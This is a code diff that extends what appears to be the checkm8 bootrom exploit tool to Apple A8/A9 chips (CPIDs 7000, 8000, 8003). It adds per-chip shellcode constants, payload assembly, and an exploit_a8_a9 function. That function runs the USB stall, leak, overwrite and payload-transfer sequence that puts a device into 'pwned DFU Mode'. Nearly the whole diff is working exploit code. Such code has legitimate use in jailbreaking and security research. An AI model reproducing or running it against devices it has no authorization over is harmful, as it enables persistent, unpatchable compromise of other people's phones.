@@ -419,6 +419,60 @@ def payload(cpid):
                            prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800,
                                                                                                    t8011_func_gadget,
                                                                                                    t8011_callbacks)
+    if cpid == 0x7000:
+        constants_usb_s7000 = [
+            0x180380000,  # 1 - LOAD_ADDRESS
+            0x6578656365786563,  # 2 - EXEC_MAGIC
+            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
+            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
+            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
+            0x10000EBB4,  # 6 - USB_CORE_DO_IO
+        ]
+        constants_checkm8_s7000 = [
+            0x180088760,  # 1 - gUSBDescriptors
+            0x1800888C8,  # 2 - gUSBSerialNumber
+            0x10000E074,  # 3 - usb_create_string_descriptor
+            0x18008062A,  # 4 - gUSBSRNMStringDescriptor
+            0x1800E0C00,  # 5 - PAYLOAD_DEST
+            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
+            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
+            0x180088878,  # 8 - PAYLOAD_PTR
+        ]
+        s7000_handler = asm_arm64_x7_trampoline(0x10000EEE4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode(
+            'usb_0xA1_2_arm64', constants_usb_s7000)[4:]
+        s7000_shellcode = prepare_shellcode('checkm8_nopaddingcorruption_arm64', constants_checkm8_s7000)
+        assert(len(s7000_shellcode) <= PAYLOAD_OFFSET_ARM64)
+        assert(len(s7000_handler) <= PAYLOAD_SIZE_ARM64)
+        return s7000_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s7000_shellcode)) + s7000_handler
+
+    if cpid == 0x8003:
+        constants_usb_s8003 = [
+            0x180380000,  # 1 - LOAD_ADDRESS
+            0x6578656365786563,  # 2 - EXEC_MAGIC
+            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
+            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
+            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
+            0x10000EE78,  # 6 - USB_CORE_DO_IO
+        ]
+        constants_checkm8_s8003 = [
+            0x1800877E0,  # 1 - gUSBDescriptors
+            0x180087958,  # 2 - gUSBSerialNumber
+            0x10000E354,  # 3 - usb_create_string_descriptor
+            0x1800807DA,  # 4 - gUSBSRNMStringDescriptor
+            0x1800E0C00,  # 5 - PAYLOAD_DEST
+            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
+            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
+            0x1800878F8,  # 8 - PAYLOAD_PTR
+        ]
+        s8003_handler = asm_arm64_x7_trampoline(0x10000F1B0) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode(
+            'usb_0xA1_2_arm64', constants_usb_s8003)[4:]
+        s8003_shellcode = prepare_shellcode('checkm8_nopaddingcorruption_arm64', constants_checkm8_s8003)
+
+        assert len(s8003_shellcode) <= PAYLOAD_OFFSET_ARM64
+
+        assert len(s8003_handler) <= PAYLOAD_SIZE_ARM64
+
+        return s8003_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s8003_shellcode)) + s8003_handler
     if cpid == 0x8012:
         constants_usb_t8012 = [
             0x18001C000,  # 1 - LOAD_ADDRESS
@@ -628,3 +682,55 @@ def exploit():
     print('Device is now in pwned DFU Mode.')
     print('(%0.2f seconds)' % (time.time() - start))
     dfu.release_device(device)
+
+def exploit_a8_a9():
+  print('*** checkm8 exploit by axi0mX ***')
+
+  device = dfu.acquire_device()
+  start = time.time()
+  print('Found:', device.serial_number)
+  if 'PWND:[' in device.serial_number:
+    print('Device is already in pwned DFU Mode. Not executing exploit.')
+    return
+  padding = 0x400 + 0x80 + 0x80
+  overwrite = struct.pack('<32xQQ', 0x180380000, 0)
+  if 'CPID:8000' in device.serial_number or\
+      'CPID:8003' in device.serial_number:
+    payload_a8_a9 = payload(0x8003)
+  elif 'CPID:7000' in device.serial_number:
+    payload_a8_a9 = payload(0x7000)
+
+  stall(device)
+  leak(device)
+  for i in range(40):
+      no_leak(device)
+  dfu.usb_reset(device)
+  dfu.release_device(device)
+
+  device = dfu.acquire_device()
+  device.serial_number
+  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * padding, 10)
+  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
+  dfu.release_device(device)
+
+  time.sleep(0.5)
+
+  device = dfu.acquire_device()
+  usb_req_stall(device)
+  usb_req_leak(device)
+  usb_req_leak(device)
+  usb_req_leak(device)
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, overwrite, 100)
+  for i in range(0, len(payload_a8_a9), 0x800):
+    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload_a8_a9[i:i+0x800], 100)
+  dfu.usb_reset(device)
+  dfu.release_device(device)
+
+  device = dfu.acquire_device()
+  if 'PWND:[checkm8]' not in device.serial_number:
+    print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
+    sys.exit(1)
+  print('Device is now in pwned DFU Mode.')
+  print('(%0.2f seconds)' % (time.time() - start))
+  dfu.release_device(device)
